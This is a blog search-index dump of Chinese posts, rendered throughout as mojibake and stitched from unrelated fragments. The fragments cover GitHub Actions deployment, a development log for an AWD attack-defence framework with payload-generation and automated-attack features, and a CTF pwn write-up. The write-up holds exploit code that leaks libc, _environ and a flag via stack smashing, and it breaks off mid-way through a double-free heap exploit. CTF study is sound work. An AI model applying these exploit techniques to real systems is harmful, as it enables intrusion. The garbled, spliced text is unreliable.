å›¾ 1ï½œActions é¡µé¢ å¦‚æœé‡åˆ°äº†é—®é¢˜ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å±•å¼€æ¯ä¸€æ­¥æ¥æŸ¥çœ‹å‘½ä»¤è¡Œçš„è¾“å‡ºã€‚ è‡³æ­¤å°±å®ç°äº†ç®€å•çš„æŒç»­éƒ¨ç½²ï¼Œä¹Ÿå°±æ˜¯ CD æµç¨‹ã€‚CI æµç¨‹ç±»ä¼¼ï¼Œä¸è¿‡ pAssWD çš„ä½“é‡ä¸å¤§ï¼ˆæˆ‘æ‡’å¾—å†™æµ‹è¯•ï¼‰å°±æ²¡æœ‰å†™æµ‹è¯•ï¼Œäºæ˜¯ CI è¿™é‡Œå°±æ²¡æœ‰æ¼”ç¤ºäº†ã€‚ æ³¨ï¼šå®é™…ä¸Šï¼Œç”±äºæˆ‘éƒ¨ç½²åˆ° GitHub Pagesï¼Œè€Œç½‘ç«™ä¸Šå·²ç»æœ‰å†…å®¹äº†ï¼ˆå°±æ˜¯è¿™ä¸ªåšå®¢ï¼‰ï¼Œå› æ­¤å®é™…ä¸Šæ˜¯éƒ¨ç½²åˆ°äº† http://blog_url/pAssWD ä¸‹ã€‚ä¸ºæ­¤éœ€è¦ä¿®æ”¹ package.json æ–°å¢ä¸€ä¸ª homepage å­—æ®µã€‚ç”±äºç»‘å®šäº†è‡ªå·±çš„åŸŸåè¿˜éœ€è¦åœ¨æ ¹ç›®å½•æ”¾ä¸€ä¸ª CNAME æ–‡ä»¶ï¼Œå°±åƒè¿™ä¸ªåšå®¢çš„ repo ä¸€æ ·ã€‚ ","date":"2020-07-16","objectID":"/github-actions-cd/:2:0","tags":["CI/CD"],"title":"é—»é¸¡èµ·èˆï¼šåˆ©ç”¨ GitHub Actions è¿›è¡ŒæŒç»­éƒ¨ç½²","uri":"/github-actions-cd/"},{"categories":["å‰ç«¯"],"content":"Platform for Attacking Swiftly \u0026 Smoothly With Defending ","date":"2020-06-27","objectID":"/passwd/:0:0","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"pAssWD ç®€ä»‹ æˆ‘å’Œä¸¤ä½ç ”ç©¶ç”Ÿå­¦é•¿åœ¨æ‰“äº†å‡ æ¬¡ AWD æ¯”èµ›åï¼Œæ·±æ·±ä½“ä¼šåˆ°äº†ç»éªŒå’Œå·¥å…·å¯¹è¿™ç§æ¯”èµ›æ¨¡å¼çš„å·¨å¤§å¸®åŠ©ã€‚å‰è€…åªèƒ½é å¤šå‚åŠ æ¯”èµ›æ¥ç§¯ç´¯ï¼Œåè€…å´æ˜¯å¯ä»¥è‡ªå·±é€æ­¥æ”¶é›†çš„ã€‚ä¸ºäº†åœ¨ AWD æ¯”èµ›ä¸­å‘æŒ¥åœ°æ›´åŠ å‡ºè‰²ï¼Œæˆ‘ä»¬å¼€å§‹æ­å»ºè‡ªå·±çš„ AWD æ¡†æ¶ï¼Œæˆ‘ç»™å®ƒèµ·äº†ä¸ªæœ‰è¶£çš„åå­—ï¼špAssWD (Platform for Attacking Swiftly \u0026 Smoothly With Defending)ã€‚ æˆ‘ä»¬ç›¸ä¿¡ï¼Œè¿™ä¸€æ¡†æ¶å°†æ”¹å–„æˆ‘ä»¬çš„ AWD æ¯”èµ›ä½“éªŒã€‚ ","date":"2020-06-27","objectID":"/passwd/:1:0","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"å¼€å§‹å¼€å‘ é¡¹ç›®åŸºäºæˆ‘ä»¬å·²ç»æ”¶é›†åˆ°çš„ä¸€äº› python è„šæœ¬ã€‚è€ƒè™‘åˆ°å…¼å®¹æ€§é—®é¢˜ï¼Œç»Ÿä¸€ç‰ˆæœ¬ä¸º Python 2.7ã€‚ä¸ºäº†å¢åŠ çµæ´»æ€§å’Œå¯ç§»æ¤æ€§ï¼Œæˆ‘ä»¬é‡‡ç”¨å‰åç«¯åˆ†ç¦»å¼€å‘ã€‚è¿™æ ·æˆ‘ä¸ä»…å¯ä»¥åš web ç«¯ï¼Œè¿˜å¯ä»¥æ„å»ºè·¨å¹³å°çš„ Electron æ¡Œé¢ç«¯ã€‚æœ€ç»ˆåˆ†å·¥ä¸ºä¸¤ä½å­¦é•¿è´Ÿè´£åç«¯å¼€å‘ï¼Œæˆ‘è´Ÿè´£å‰ç«¯å¼€å‘ã€‚ ","date":"2020-06-27","objectID":"/passwd/:2:0","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"æŠ€æœ¯æ¶æ„ å‰ç«¯ Quasar Framework (Vue.js) åç«¯ Flask (Python) Tornado (Python) ","date":"2020-06-27","objectID":"/passwd/:3:0","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"éœ€æ±‚ é€šè¿‡äº¤æµç¡®å®šäº†ä¸€äº›å°šä¸æˆç†Ÿçš„éœ€æ±‚ï¼Œè¿™é‡Œä»…åŒ…å«æ ¸å¿ƒåŠŸèƒ½ï¼š ç™»å½•ä¸è®¤è¯ é…ç½®æ¯”èµ›ä¿¡æ¯å’Œé¶æœºä¿¡æ¯ æ–‡ä»¶ä¸Šä¼ ä¸å…±äº« å®æ—¶è¯»å–å¹¶æ˜¾ç¤ºç³»ç»Ÿæ—¥å¿—ä¸é¶æœºæ—¥å¿— å¤‡ä»½ web ç›®å½• è§£å‹æœ¬åœ°å¤‡ä»½æ–‡ä»¶å¹¶æŸ¥æ€åé—¨ æ ¹æ®åé—¨ç”Ÿæˆæ··æ·† payload æ ¹æ®æ”»å‡»æ—¥å¿—ç”Ÿæˆ payload è‡ªåŠ¨åŒ–æ”»å‡» åŒºåˆ†ä¸åŒè¯­è¨€æ–‡ä»¶ java æµé‡è®°å½• ","date":"2020-06-27","objectID":"/passwd/:4:0","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"å¼€å‘åˆæœŸ ","date":"2020-06-27","objectID":"/passwd/:5:0","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"Login é¦–å…ˆæ˜¯ç™»å½•åŠŸèƒ½ï¼ˆæ³¨å†Œæ¯”è¾ƒç®€å•ï¼‰ï¼Œåç«¯é‡‡ç”¨ HTTP Basic Auth é…åˆ jwt è¿›è¡Œè®¤è¯ã€‚å› æ­¤æˆ‘ä½¿ç”¨ axios æ¨¡å— config ä¸­çš„ auth è¿™ä¸ªå­—æ®µæ¥è®¾ç½® Basic Auth å†…å®¹ã€‚é‚£ä¹ˆç™»å½•æ—¶çš„ä»£ç å°±ç±»ä¼¼ï¼š this.$axios.get('token', { auth: { username: this.username, password: sha256(this.password), }, }) è¿™é‡Œå¯¹å¯†ç è¿›è¡Œäº†å“ˆå¸Œåå‘é€ï¼Œæ–¹ä¾¿ç›´æ¥å­˜å‚¨åˆ°æ•°æ®åº“ï¼ŒåŒæ—¶é¿å…æ˜æ–‡ä¼ è¾“ã€‚ éšåä¼šæ”¶åˆ°ä¸€ä¸ª jwtï¼Œæˆ‘éœ€è¦åšçš„å°±æ˜¯å°†è¯¥ jwt è¿›è¡Œ base64 åï¼Œæ‹¼æ¥åˆ° Basic åé¢å¹¶å¡«å…¥ HTTP è¯·æ±‚å¤´ Authorization ä¸­ã€‚è€ƒè™‘åˆ°ä¹‹åçš„æ‰€æœ‰è¯·æ±‚éƒ½éœ€è¦è¿™ä¸€æ­¥ï¼Œæˆ‘å°†è¯¥è¿‡ç¨‹æ”¾åœ¨äº†è¯·æ±‚æ‹¦æˆªå™¨ä¸­ï¼š // http basic auth Vue.prototype.$token = () =\u003e { let state = JSON.parse(sessionStorage.getItem('store')) if (state) { let info = state.userInfo if (info) { return 'Basic' + Base64.encode(info.token + ':') } return '' } } Vue.prototype.$axios.interceptors.request.use( config =\u003e { config.headers.Authorization = Vue.prototype.$token() return config }, err =\u003e { Promise.reject(err) } ) è¿™é‡Œç»´æŠ¤ç™»å½•çŠ¶æ€çš„æ–¹å¼ä¸€å¦‚æ—¢å¾€ï¼Œå°† store æ•´ä¸ªå­˜å…¥ sessionStorageï¼Œé¡µé¢åˆ·æ–°æ—¶å–å›ã€‚ å®Œæˆäº†è¯·æ±‚æ‹¦æˆªå™¨çš„è®¾ç½®ï¼Œå°±å¯ä»¥ä¿è¯ç™»å½•åå‘å‡ºçš„è¯·æ±‚éƒ½å¸¦æœ‰è®¤è¯ token äº†ã€‚ é¡ºå¸¦ä¸€æï¼Œæ³¨å†ŒåŠŸèƒ½è™½ç„¶å®ç°äº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åœ¨ UI ä¸­ç›´æ¥å¼€æ”¾ã€‚æˆ‘ä»¬è®¤ä¸ºå®é™…ä½¿ç”¨ä¸­è¯¥åŠŸèƒ½æ²¡æœ‰å¿…è¦ï¼Œå› æ­¤ä»…ä»…ç”¨æ¥è°ƒè¯•ã€‚ ","date":"2020-06-27","objectID":"/passwd/:5:1","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"Settings è¿™ä¸ªéƒ¨åˆ†æŠ€æœ¯ä¸Šå…¶å®æ²¡æœ‰å¤ªå¤šçªç ´ï¼Œä¸»è¦æ—¶é—´èŠ±åœ¨æ²Ÿé€šä¸Šäº†ã€‚æœ€åˆæ²¡æœ‰è€ƒè™‘ä¸åŒæ¯”èµ›çš„é—®é¢˜ï¼Œå› æ­¤ Settings é¡µé¢ç›´æ¥æ”¾äº†é¶æœºè®¾ç½®ã€‚ä½†æ˜¯å¼•å…¥ä¸åŒæ¯”èµ›åï¼Œæ¯ä¸ªæ¯”èµ›éƒ½æœ‰è‡ªå·±çš„é¶æœºï¼Œå› æ­¤åˆ†å‡ºäº†ä¸€ä¸ª Competition é¡µé¢ç”¨æ¥å¯¹æ¯”èµ›è¿›è¡Œè¯¦ç»†è®¾ç½®ï¼ŒåŒ…æ‹¬è®¾ç½®é¶æœºã€‚ é¦–å…ˆé‡åˆ°çš„é—®é¢˜æ˜¯ï¼Œç”±äºè®¾ç½®äº†è¡¨å•éªŒè¯ï¼Œåœ¨å¡«å†™ ssh ä¿¡æ¯æ—¶å¦‚æœç©ºç€ä¼šè§¦å‘æç¤ºï¼Œå°±åƒè¿™æ ·ï¼š å›¾ 1 \" å›¾ 1 ç„¶è€Œæ–‡æœ¬æ¡†å†…éƒ¨å³ä¾§å¤šå‡ºæ¥çš„è­¦å‘Šå›¾æ ‡ä¼šå¯¼è‡´æ–‡æœ¬æ¡†çš„é•¿åº¦è¢«æ”¹å˜ï¼Œä»è€Œæ”¹å˜åŒä¸€è¡Œå†…å…¶å®ƒå…ƒç´ çš„ä½ç½®ã€‚æˆ‘çš„è§£å†³æ–¹æ¡ˆæ˜¯è®¾ç½®å°äºåŸå®½åº¦çš„ max-widthï¼Œä½¿å¾—æ–‡æœ¬æ¡†é•¿åº¦å›ºå®šã€‚ ç„¶åéœ€è¦å¯¹é¶æœºä¿¡æ¯è¿›è¡Œå¢åˆ æ”¹æŸ¥ï¼Œç•Œé¢å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š å›¾ 2 \" å›¾ 2 è¿™é‡Œçš„é—®é¢˜åœ¨äºå½“ç‚¹å‡»ä¿å­˜åï¼Œæœ‰å¯èƒ½å‘æ•°æ®åº“æ’å…¥æ‰€æœ‰æ•°æ®ï¼Œå³ä½¿å…¶ä¸­æœ‰ä¸€éƒ¨åˆ†å·²ç»å­˜åœ¨ã€‚å› æ­¤åç«¯å¤šå‘é€äº†ä¸€ä¸ª id å­—æ®µï¼Œå‰ç«¯ç‚¹å‡»ä¿å­˜å‘é€æ•°æ®æ—¶ï¼Œå¦‚æœæŸæ¡æ•°æ®æ²¡æœ‰ idï¼Œè¯´æ˜ä¸åœ¨æ•°æ®åº“ä¸­ï¼Œæ˜¯æ–°å¢çš„æ•°æ®ï¼›å¦åˆ™å°±æ˜¯å·²æœ‰æ•°æ®ï¼Œæ­£åœ¨è¿›è¡Œä¿®æ”¹ã€‚ ç±»ä¼¼çš„é—®é¢˜å‡ºç°åœ¨åˆ é™¤ä¸Šã€‚ç‚¹å‡»åŠ å·åç•Œé¢ä¸Šä¼šå¤šå‡ºä¸€è¡Œé¶æœºä¿¡æ¯ï¼Œä½†è¿˜æ²¡æœ‰æŒä¹…åŒ–åˆ°æ•°æ®åº“é‡Œã€‚å¦‚æœè¿™æ—¶å€™ç‚¹å‡»åˆ é™¤ï¼Œé‚£ä¹ˆæ˜¯ä¸éœ€è¦å’Œåç«¯äº¤äº’çš„ã€‚ç„¶è€Œå¦‚æœæ˜¯å¯¹æ•°æ®åº“ä¸­å·²å­˜åœ¨çš„æ•°æ®ç‚¹å‡»åˆ é™¤ï¼Œåˆ™éœ€è¦å‘é€è¯·æ±‚äº†ã€‚æ€ä¹ˆåŒºåˆ†è¿™ä¸¤ç§æƒ…å†µå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä¸€æ ·çš„ï¼Œå€ŸåŠ©ä¸Šé¢æåˆ°çš„ id å­—æ®µã€‚ æ¥ä¸‹æ¥èŠ±äº†å¾ˆé•¿æ—¶é—´åšæµè§ˆå™¨ç«¯çš„ sshï¼Œç»è¿‡ä¸€æ®µæ—¶é—´çš„é€‰å‹æœ€ç»ˆå†³å®šåç«¯é‡‡ç”¨åŸºäº tornado çš„ websshï¼Œå‰ç«¯é‡‡ç”¨ xterm.js æ¥è¿›è¡Œäº¤äº’ï¼Œåè®®æ˜¯ websocketã€‚è¿æ¥ webssh çš„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œå› æ­¤æˆ‘ç”»äº†ä¸€å¼ å›¾æ¥è®©è‡ªå·±ç†è§£ï¼š å›¾ 3 \" å›¾ 3 åœ¨è¿™ä¸ªéƒ¨åˆ†ä¸Šæˆ‘ä»¬èŠ±äº†å¦‚æ­¤å¤šçš„æ—¶é—´ï¼Œä»¥è‡³äºæœ€åçœ‹åˆ°è¿™ä¸ªç•Œé¢æ—¶ï¼Œæˆ‘ä»¬éƒ½é•¿èˆ’äº†ä¸€å£æ°”ï¼š å›¾ 4 \" å›¾ 4 æœ¬æ¥è¿˜ä»¥ä¸ºè¦ç”¨åˆ«çš„åŠæ³•æ¥è¿æ¥ ssh äº†ã€‚è¿™éƒ½è¦æ„Ÿè°¢ webssh é¡¹ç›®æ”¯æŒé€šè¿‡ api æ–¹å¼ç™»å½•ã€‚ webssh çš„é€Ÿåº¦æ¯”æˆ‘æƒ³è±¡çš„å¿«ã€‚ æœ€ååœ¨è¿™ä¸ªéƒ¨åˆ†åˆèŠ±äº†äº›æ—¶é—´è®¨è®º ssh é¡µé¢åŠ ä¾§è¾¹æ å’Œ â€œä¸€é”®â€ ç³»åˆ—åŠŸèƒ½çš„äº‹æƒ…ï¼Œä¸è¿‡åæ¥ç§»åŠ¨åˆ°åˆ«çš„æ¿å—äº†ã€‚ ","date":"2020-06-27","objectID":"/passwd/:5:2","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"Sharing è¿™é‡Œå°±æ˜¯æ–‡ä»¶ä¸Šä¼ ã€ä¸‹è½½ã€è·å–æ–‡ä»¶åˆ—è¡¨çš„åŠŸèƒ½ï¼Œæ²¡æœ‰ä»€ä¹ˆéš¾åº¦ã€‚ä¸è¿‡åœ¨æŠŠè„šæœ¬ä¸Šä¼ åˆ°é¶æœºæ—¶ï¼Œè€—æ—¶æ¯”è¾ƒé•¿ï¼Œå› æ­¤æ·»åŠ äº† loading çš„æ ‡è¯†æ¥æ”¹å–„ç”¨æˆ·ä½“éªŒã€‚ åœ¨è¿™ä¸€é˜¶æ®µçš„å¼€å‘ä¸­æˆ‘ä»¬å¼€å§‹é€šè¿‡ api_doc.md æ¥æ²Ÿé€šï¼Œå¤§ä½“ä¸Šå°±æ˜¯ä¸€ä¸ª api åˆ—è¡¨å’Œ todolist çš„ç»“åˆï¼š - auth.py: - [x] /api/users/reg - methods=['POST'] - recv: `{username,password}` - return: `{data:{username}}` - [x] /api/users/\u003cint:id\u003e - methods=['GET'] - recv: `id` - return: `{data:{username}}` - [x] /api/token - methods=['GET'] - recv: Basic Auth (`username,password`) or (`\"username\":token,\"password\":any`) - return: `{data:{token,username,duration}}` - [x] /api/resource - methods=['GET'] - recv: Basic Auth - return: `{data:\"Hello, %s!\"% username}` é€‰æ‹©è¿™ç§æ–¹å¼æ˜¯å› ä¸º flask çš„ swagger æ’ä»¶éœ€è¦é‡æ„ä»£ç â€¦â€¦ åœ¨è¿™ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€æ¬¡å‡ºç°éœ€è¦è·å–å½“å‰æ¯”èµ›çš„æ‰€æœ‰é¶æœºä¿¡æ¯çš„éœ€æ±‚ã€‚åæ¥æˆ‘å°†è¿™ä¸ªåŠŸèƒ½å°è£…æˆäº†ä¸€ä¸ªå¼‚æ­¥å‡½æ•°ï¼š // get current gameboxes Vue.prototype.$getTargets = async function () { let curComp = await this.$axios.get('get_current_game').then(res =\u003e { if (res) { return res.data.data } }) if (!curComp) return [] return this.$axios.get(`get_ssh/game/${curComp}`).then(res =\u003e { if (res) { return res.data.data } }) } é¡ºä¾¿å­¦äº†ä¸‹ async/await ç”¨æ³•ã€‚ä¹‹å‰å¯¹ await æœ‰äº›è¯¯è§£ï¼Œå®é™…ä¸Šè¿™é‡Œçš„ await ä»…ä»…ä¿è¯ curComp åœ¨åç»­ä½¿ç”¨æ—¶å·²ç»æ¥æ”¶åˆ°äº† Promise å¯¹è±¡ resolve çš„å€¼ï¼Œå¼‚æ­¥è°ƒç”¨ä¾ç„¶æ˜¯å¼‚æ­¥è°ƒç”¨ã€‚ ","date":"2020-06-27","objectID":"/passwd/:5:3","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"Backing up è¿™ä¸ªéƒ¨åˆ†åŸºæœ¬éƒ½æ˜¯åç«¯çš„æ´»ã€‚ä¸è¿‡ç›®å‰ï¼ŒæŸ¥æ€åé—¨å’Œ web åº”ç”¨è¯†åˆ«ä¸¤ä¸ªåŠŸèƒ½è™½ç„¶å·²ç»æµ‹è¯•æˆåŠŸï¼Œä½†æ˜¯è¿˜æ²¡æœ‰æƒ³å¥½å¯¹åº”çš„ UI æ€ä¹ˆåšã€‚ ","date":"2020-06-27","objectID":"/passwd/:5:4","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"Logging è¿™æ˜¯èŠ±è´¹æ—¶é—´æœ€é•¿çš„éƒ¨åˆ†ï¼Œä¸»è¦æ˜¯ç”±äºä¸­é—´ä¸€æ®µæ—¶é—´æˆ‘å’Œåç«¯åŒå­¦ç©ºé—²æ—¶é—´æ€»æ˜¯é”™å¼€ã€ä»¥åŠå¼•å…¥ SSE ååç«¯å‡ºäº†å¾ˆå¤šé”™è¯¯ã€‚ æ—¥å¿—è®°å½•åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼ŒpAssWD ç³»ç»Ÿçš„æ—¥å¿—ä»¥åŠæ¯ä¸ªé¶æœºè‡ªå·±çš„æ—¥å¿—ã€‚é¶æœºæ—¥å¿—åˆåˆ†ä¸º web æ—¥å¿—å’Œ attack æ—¥å¿—ï¼Œåè€…æ˜¯å‰è€…çš„çœŸå­é›†ï¼Œä»…åŒ…å«äº†è¢«è®¤ä¸ºæ˜¯æ¶æ„æ”»å‡»çš„æ—¥å¿—ã€‚è¿™é‡Œé¦–å…ˆéœ€è¦æ–°æ—¥å¿—çš„æ¶ˆæ¯æé†’ï¼Œæœ€åˆæƒ³é€šè¿‡ websocket æ¥åšï¼Œåæ¥é‡‡ç”¨äº†æ›´è½»é‡çº§çš„ SSEã€‚ å‰ç«¯è¿›è¡Œæ¶ˆæ¯æé†’çš„é€»è¾‘å¾ˆç®€å•ï¼šç™»å½•æ—¶å»ºç«‹ SSE è¿æ¥ï¼Œæ”¶åˆ°æ–°æ—¥å¿—æ—¶ï¼ŒVuex ç»´æŠ¤çš„ logs å˜é‡å°± + 1ã€‚è¿™ä¼šå¯¼è‡´ Logging ä¾§è¾¹æ å‡ºç°çº¢ç‚¹ï¼Œè€Œå½“ç‚¹è¿› Logging é¡µé¢åçº¢ç‚¹å°±ä¼šæ¶ˆå¤±ã€‚ ä¹‹åå°±æ˜¯åœ¨ Logging é¡µé¢é€šè¿‡ API è·å–æ—¥å¿—åˆ—è¡¨ã€‚å…¶ä¸­ messageï¼Œparamï¼Œdata ä¸‰é¡¹ç”±äºå„ç§åŸå› ï¼ˆé•¿åº¦è¿‡é•¿ã€æ ¼å¼å˜åŒ–å¤ªå¤šï¼‰ï¼Œæˆ‘é€‰æ‹©åœ¨æ¯æ¡æ—¥å¿—çš„æœ€åè®©ç”¨æˆ·ç‚¹å‡»æŒ‰é’®è‡ªè¡ŒæŸ¥çœ‹ json æ ¼å¼çš„æ•°æ®ã€‚å¦‚å›¾ï¼š å›¾ 5 \" å›¾ 5 ä¸­é—´å‡ºç°äº†ä¸€äº›æ²Ÿé€šä¸Šçš„é—®é¢˜ï¼Œå¤§å¤šå›´ç»•æ•°æ®æ ¼å¼ã€æ•°æ®è·å–æ–¹å¼ç­‰é—®é¢˜ã€‚ä¸»è¦æ˜¯å› ä¸ºæˆ‘ä¸ç†Ÿæ‚‰åç«¯çš„å®ç°ã€åç«¯ä¹Ÿä¸ç†Ÿæ‚‰å‰ç«¯çš„ä¸€äº›åŸç†å¯¼è‡´çš„ã€‚ æœ€åå°±æ˜¯å¦‚ä½•è®©ç”¨æˆ·ä¸åˆ·æ–°é¡µé¢ä¹Ÿèƒ½æ¥æ”¶æ–°æ—¥å¿—çš„é—®é¢˜äº†ã€‚ç›®å‰å’Œåç«¯è®¨è®ºä¸‹æ¥ï¼Œè™½ç„¶åç«¯å·²ç»ç»™å‡ºäº†ä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œæš‚æ—¶è¿˜æ˜¯å°†è¯¥åŠŸèƒ½çš„å¼€å‘å»¶ååˆ°å¼€å‘ä¸­æœŸã€‚ æ—¥å¿—è¿™ä¸€å—è¿˜æœ‰ä¸€äº›é—®é¢˜æ²¡æœ‰è§£å†³ï¼Œå°†åœ¨åç»­å’Œå®æ—¶æ¥æ”¶æ—¥å¿—åŠŸèƒ½ä¸€èµ·è§£å†³ã€‚è§£å†³è¿™äº›é—®é¢˜éœ€è¦çš„æ—¶é—´ï¼Œä¼°è®¡ä¸å°‘äºæˆ‘ä»¬åœ¨ webssh é—®é¢˜ä¸ŠèŠ±è´¹çš„ã€‚ ","date":"2020-06-27","objectID":"/passwd/:5:5","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["å‰ç«¯"],"content":"å¼€å‘ä¸­æœŸ 2020 å¹´ 6 æœˆ 27 æ—¥ï¼ŒpAssWD v0.1.0 å‘å¸ƒï¼Œæ ‡å¿—ç€å¼€å‘åˆæœŸçš„ç»“æŸã€‚ç›®å‰ pAssWD å·²ç»å¯ä»¥åœ¨ AWD èµ›äº‹ä¸­èµ·åˆ°ä¸€å®šä½œç”¨äº†ã€‚åŒä¸€å¤©åˆå‘å¸ƒäº† v0.1.1ï¼Œä¿®å¤äº†ç”±äºä»£ç ä¼˜åŒ–å¯¼è‡´çš„ bugã€‚ ä¸­æœŸå¼€å§‹å†™ CHANGELOGï¼Œå­¦ä¹ äº†åƒ SemVer, badges ä»¥åŠ GitHub commit message çš„ Angular è§„èŒƒç­‰ç­‰ã€‚å¤§çº¦åœ¨ v0.3.0 å‘å¸ƒå‰å­¦ä¹ äº† åˆ©ç”¨ GitHub Actions è¿›è¡ŒæŒç»­éƒ¨ç½²ï¼Œæ„Ÿè§‰å¼€å‘æµç¨‹ç¡®å®æœ‰å¿…è¦å¼•å…¥è‡ªåŠ¨åŒ–ã€‚ ","date":"2020-06-27","objectID":"/passwd/:6:0","tags":["Quasar","é¡¹ç›®"],"title":"pAssWD å¼€å‘è®°å½•","uri":"/passwd/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å‡†å¤‡ä»Šå¹´ç½‘é¼æ¯æ—¶å¤ç°çš„ä¸€äº›é¢˜ã€‚é¢˜ç›®ä¸æ˜¯å¾ˆå…¨ï¼Œå› ä¸ºæœ‰äº›é¢˜ä¸å¤ªä¼šã€‚ ","date":"2020-05-04","objectID":"/wdb2018-pwn/:0:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"GUESS é¢˜ç›®æœ‰ä¸‰æ¬¡çŒœ flag æœºä¼šï¼Œæ¯æ¬¡éƒ½ä¼š fork å‡ºå­è¿›ç¨‹ï¼Œå¹¶ä¸”å¼€å¯äº† canaryã€‚å°è¯•è¿è¡Œå¯ä»¥å‘ç°è¯»å–çš„ flag æ”¾åœ¨äº†æ ˆä¸Šï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ ˆåœ°å€æ¥æ³„éœ² flagï¼Œè€Œæ³„éœ²æ ˆåœ°å€éœ€è¦å…ˆæ³„éœ² libcã€‚ é¦–å…ˆæˆ‘ä»¬å¯ä»¥è¦†ç›– argv[0] ä¸º puts@gotï¼Œå€ŸåŠ© __stack_chk_fail å‡½æ•°çš„æŠ¥é”™æ¥æ³„éœ² libcã€‚è¾“å…¥ä»»æ„å­—ç¬¦ä¸²è¿›å…¥ strncmpï¼Œåœ¨æ­¤å¤„ä¸‹æ–­ç‚¹ï¼Œé€šè¿‡ p \u0026__libc_argv[0] å¯å¾—åˆ° argv[0] åœ°å€ï¼Œç„¶åæŸ¥çœ‹æ ˆå¾—åˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ‰€åœ¨åœ°å€ï¼Œä¸¤ä¸ªåœ°å€çš„è·ç¦»å°±æ˜¯æˆ‘ä»¬éœ€è¦æ ˆæº¢å‡ºçš„é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦æ˜¯ 0x128ã€‚ç„¶åæ”¾ä¸Š puts@got å°±èƒ½æ³„éœ² libcï¼Œæ¥ä¸‹æ¥å°±èƒ½å¾—åˆ° _environ åœ°å€ã€‚ è®¡ç®— _environ åœ°å€åˆ° flag åœ°å€çš„è·ç¦»å°±èƒ½å¾—åˆ° flag çœŸå®åœ°å€ï¼Œè¿™ä¸ªè·ç¦»æ˜¯ 0x168ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸‰æ¬¡åœ°å€æ³„éœ²ä¸­è¯»åˆ° flagã€‚ def ssp(payload): sla('flag', 'a'*0x128 + payload) ru('detected ***:') ssp(p64(elf.got['puts'])) puts = uu64(r(6)) base,libc,system = leak_libc('puts',puts,libc) env = base + libc.sym['_environ'] ssp(p64(env)) flag = uu64(r(6)) - 0x168 ssp(p64(flag)) ","date":"2020-05-04","objectID":"/wdb2018-pwn/:1:0","tags":["æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"ç½‘é¼æ¯ 2018 Pwn","uri":"/wdb2018-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"blind æœ¬é¢˜å­˜åœ¨ double free ä½†æ²¡æœ‰ show åŠŸèƒ½ï¼Œç”³è¯·å †å—æ—¶åªèƒ½ç”³è¯· 0x68 å¤§å°çš„ï¼Œè¿™ä¸ªå¤§å°æˆ‘ä»¬å–œé—»ä¹è§ï¼Œå› ä¸ºç”³è¯·åˆ°çš„å®é™…å †å—å¤§å°ä¸º 0x70ï¼Œè€Œæˆ‘ä»¬ä¸€èˆ¬ä¼ªé€  chunk size éƒ½æ˜¯å€ŸåŠ© 0x7f æ¥æ„é€ ã€‚ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å€ŸåŠ© double free ç”³è¯·å †å—åˆ°å…¨å±€æ•°ç»„çš„ä½ç½®ï¼Œä¼ªé€ çš„å †å—å¯ä»¥åœ¨ 0x602060-0x23 å¤„æ‰¾åˆ°ï¼Œç„¶åå°±å¯ä»¥åœ¨å…¨å±€æ•°ç»„ä¸Šæ–¹å†ä¼ªé€ ä¸€ä¸ª 0x100 å¤§å°çš„ chunkï¼Œä»è€Œç»•è¿‡ 0x68 çš„é™åˆ¶ç”³è¯·åˆ° small chunkã€‚è¿™é‡Œæˆ‘ä»¬å°† ptr[0] å’Œ ptr[2] å†™æˆ 0x602060ï¼Œå°† ptr[4] å†™æˆ 0x602150ï¼Œæˆ‘ä»¬ç¨åä¼šçœ‹åˆ°åŸå› ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ free æ—¶ä¼šæ£€æŸ¥åä¸¤å—çš„ chunk size æ˜¯å¦åˆæ³•ï¼Œå› æ­¤æˆ‘ä»¬åŒæ ·éœ€è¦ä¼ªé€ ï¼šä¸‹ä¸€ä¸ª chunk çš„èµ·å§‹åœ°å€ä¸º 0x602050+0x100 = 